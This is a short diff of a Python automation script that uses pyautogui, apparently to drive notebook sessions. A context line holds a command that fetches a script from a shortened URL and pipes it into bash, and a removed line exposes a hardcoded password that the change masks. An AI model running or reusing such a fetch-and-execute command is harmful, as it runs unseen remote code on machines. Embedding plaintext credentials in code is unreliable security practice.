@@ -5,7 +5,7 @@ import pyautogui
 
 col_cmd = "!wget -q -O - bit.ly/cpu02 | bash"
 listfile = '/home/one/g167'
-gpass = "Ms123456789"
+gpass = "********"
 new = True
 global_slow_motion = 2
 
